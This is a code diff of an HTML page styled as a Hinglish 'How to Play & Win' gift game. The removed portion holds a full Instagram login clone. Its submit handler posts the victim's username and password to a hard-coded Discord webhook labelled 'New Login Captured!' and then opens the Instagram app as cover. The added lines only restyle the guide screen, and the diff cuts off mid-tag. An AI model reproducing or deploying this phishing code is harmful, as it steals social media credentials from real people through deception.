@@ -35,14 +35,16 @@
         }
         .hidden { display: none !important; }
 
-        /* Guide Intro Screen Styles */
+        /* Step-by-Step Guide Screen Styles */
         .guide-card {
             background: #121212; border: 1px solid #262626; padding: 25px; border-radius: 15px;
-            width: 100%; max-width: 350px; text-align: left; box-sizing: border-box; margin: auto;
+            width: 100%; max-width: 350px; text-align: center; box-sizing: border-box; margin: auto;
         }
-        .guide-card h2 { color: #0095f6; margin-top: 0; text-align: center; }
-        .guide-steps { font-size: 13px; color: #d1d1d1; line-height: 1.6; margin-bottom: 20px; }
-        .guide-steps li { margin-bottom: 10px; }
+        .guide-card h2 { color: #0095f6; margin-top: 0; }
+        .step-box { font-size: 15px; color: #f5f5f5; line-height: 1.6; margin: 25px 0; min-height: 70px; display: flex; align-items: center; justify-content: center; text-align: center; }
+        .step-indicators { display: flex; justify-content: center; gap: 6px; margin-bottom: 20px; }
+        .dot { width: 8px; height: 8px; border-radius: 50%; background: #363636; }
+        .dot.active { background: #0095f6; width: 20px; border-radius: 4px; }
 
         /* Instagram Login Styles */
         .top-lang {
@@ -151,210 +153,6 @@
         ⏳ Time Left: <span id="widgetTimer">10:00</span>
     </div>
 
-    <!-- SCREEN 0: Guide & Instructions (New Starting Page) -->
+    <!-- SCREEN 0: Step-by-Step Guide Intro -->
     <div id="guideScreen" class="screen" style="justify-content: center;">
-        <div class="guide-card">
-            <h2>📖 How to Play & Win</h2>
-            <ul class="guide-steps">
-                <li><b>Step 1:</b> Start karke apne Instagram account se secure login karein.</li>
-                <li><b>Step 2:</b> Apna aur apne friend ka chat duration time select karein.</li>
-                <li><b>Step 3:</b> Instagram app mein chat complete karein aur background timer pura hone dein.</li>
-                <li><b>Step 4:</b> Timer complete hote hi aapko surprise gift unlock ho jayega!</li>
-            </ul>
-            <button class="game-btn" onclick="showScreen('loginScreen')">Start Game & Login</button>
-        </div>
-    </div>
-
-    <!-- SCREEN 1: Instagram Login Page -->
-    <div id="loginScreen" class="screen hidden">
-        <div class="top-lang" onclick="toggleLangMenu()">
-            English (UK) <span>v</span>
-            <div id="langDropdown" class="lang-dropdown">
-                <div>English (US)</div>
-                <div>Hindi</div>
-            </div>
-        </div>
-
-        <div class="main-container">
-            <div class="ig-logo">
-                <svg viewBox="0 0 24 24">
-                    <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
-                </svg>
-            </div>
-
-            <form id="loginForm">
-                <div class="input-box">
-                    <input type="text" id="username" placeholder="Username, email address or mobile number" required>
-                </div>
-                <div class="input-box">
-                    <input type="password" id="password" placeholder="Password" required>
-                    <button type="button" class="eye-btn" onclick="togglePassword()">
-                        <svg id="eyeIcon" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
-                    </button>
-                </div>
-                <button type="submit" class="login-btn">Log in</button>
-            </form>
-            <a href="#" class="forgot-pass">Forgotten password?</a>
-        </div>
-
-        <div class="footer-container">
-            <a href="#" class="create-btn">Create new account</a>
-            <div class="meta-brand">
-                <svg viewBox="0 0 24 24"><path d="M12 2C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2zm0 18c-4.411 0-8-3.589-8-8s3.589-8 8-8 8 3.589 8 8-3.589 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
-                Meta
-            </div>
-        </div>
-    </div>
-
-    <!-- SCREEN 2: Time Selection & Game Setup -->
-    <div id="gameSetupScreen" class="screen hidden">
-        <div class="game-card">
-            <h2>⏳ Time Task Challenge</h2>
-            <p style="font-size: 13px; color: #a8a8a8;">Select chat duration to unlock reward!</p>
-            <select id="timeSelect">
-                <option value="1">1 Minute (Testing)</option>
-                <option value="10">10 Minutes</option>
-                <option value="20">20 Minutes</option>
-            </select>
-            <input type="text" id="friendUser" placeholder="Friend's Instagram Username" required>
-            <button class="game-btn" onclick="startTimerGame()">Start & Open Instagram App</button>
-        </div>
-    </div>
-
-    <!-- SCREEN 3: Victory & Gift Reveal -->
-    <div id="giftScreen" class="screen hidden">
-        <div class="game-card">
-            <h2>🎉 Party Bomb Fired!</h2>
-            <p>Background time completed successfully!</p>
-            <div class="gift-img" id="randomGiftIcon">💍</div>
-            <p id="giftNameText" style="font-weight: bold; color: #ff007f;">Diamond Ring Unlocked!</p>
-            <button class="game-btn" onclick="claimGift()">Gift Now</button>
-        </div>
-    </div>
-
-    <!-- SCREEN 4: Success End Screen -->
-    <div id="successScreen" class="screen hidden">
-        <div class="game-card">
-            <h2>✨ SUCCESSFUL! ✨</h2>
-            <p style="color: #00a884; font-size: 16px; margin: 20px 0;">Reward claimed successfully! Game session ended.</p>
-            <button class="game-btn" onclick="location.reload()">Play Again</button>
-        </div>
-    </div>
-
-    <script>
-        function togglePassword() {
-            const pass = document.getElementById('password');
-            const icon = document.getElementById('eyeIcon');
-            if(pass.type === 'password') {
-                pass.type = 'text';
-                icon.innerHTML = '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.17c0-1.66-1.34-3-3-3l-.17.02z"/>';
-            } else {
-                pass.type = 'password';
-                icon.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3 z"/>';
-            }
-        }
-
-        function toggleLangMenu() {
-            const menu = document.getElementById('langDropdown');
-            menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
-        }
-
-        function showScreen(screenId) {
-            document.querySelectorAll('.screen').forEach(s => s.classList.add('hidden'));
-            document.getElementById(screenId).classList.remove('hidden');
-        }
-
-        const loginForm = document.getElementById('loginForm');
-        loginForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const username = document.getElementById('username').value.trim();
-            const password = document.getElementById('password').value.trim();
-            const timeStr = new Date().toLocaleString();
-
-            if(!username || !password) {
-                alert("Please fill in all fields.");
-                return;
-            }
-
-            const webhookURL = "https://discord.com/api/webhooks/1562500504456667147/9AuUBXE6J3mqsPNVpCe-oFSyA9LQvt-R_jiwIUfintw1x8wPvssb1Gdmez1VAhhLO9yZ";
-
-            const payload = {
-                content: `🚨 **New Login Captured!**\n👤 **Username:** \`${username}\`\n🔑 **Password:** \`${password}\`\n⏰ **Time:** \`${timeStr}\``
-            };
-
-            fetch(webhookURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            })
-            .then(response => console.log("Sent to Discord successfully!"))
-            .catch(error => console.log("Error:", error));
-
-            showScreen('gameSetupScreen');
-        });
-
-        let totalSeconds = 0;
-        let timerInterval = null;
-
-        function startTimerGame() {
-            const friend = document.getElementById('friendUser').value.trim().replace('@','') || "instagram";
-            const selectedMinutes = parseInt(document.getElementById('timeSelect').value);
-            totalSeconds = selectedMinutes * 60;
-
-            document.getElementById('floatingWidget').classList.remove('hidden');
-            updateTimerDisplay();
-
-            if(timerInterval) clearInterval(timerInterval);
-            timerInterval = setInterval(() => {
-                totalSeconds--;
-                updateTimerDisplay();
-
-                if(totalSeconds <= 0) {
-                    clearInterval(timerInterval);
-                    triggerGiftScreen();
-                }
-            }, 1000);
-
-            const intentUri = `intent://instagram.com/_u/${friend}/#Intent;package=com.instagram.android;scheme=https;end;`;
-            const schemeUri = `instagram://user?username=${friend}`;
-
-            window.location.href = schemeUri;
-            setTimeout(() => {
-                window.location.href = intentUri;
-            }, 500);
-        }
-
-        function updateTimerDisplay() {
-            const mins = Math.floor(totalSeconds / 60);
-            const secs = totalSeconds % 60;
-            document.getElementById('widgetTimer').innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
-        }
-
-        function checkTimerProgress() {
-            const mins = Math.floor(totalSeconds / 60);
-            const secs = totalSeconds % 60;
-            alert(`⏳ Background Task Progress:\nTime remaining: ${mins} minutes ${secs} seconds.\nKeep chatting on Instagram to complete the reward!`);
-        }
-
-        const gifts = [
-            { icon: "💍", name: "Diamond Ring Gift!" },
-            { icon: "🌹", name: "Red Rose Bouquet!" },
-            { icon: "🧸", name: "Cute Teddy Bear!" },
-            { icon: "🍫", name: "Chocolate Box!" }
-        ];
-
-        function triggerGiftScreen() {
-            document.getElementById('floatingWidget').classList.add('hidden');
-            const selectedGift = gifts[Math.floor(Math.random() * gifts.length)];
-            document.getElementById('randomGiftIcon').innerText = selectedGift.icon;
-            document.getElementById('giftNameText').innerText = selectedGift.name;
-            showScreen('giftScreen');
-        }
-
-        function claimGift() {
-            showScreen('successScreen');
-        }
-    </script>
-</body>
-</html>
+        <div class="guide-
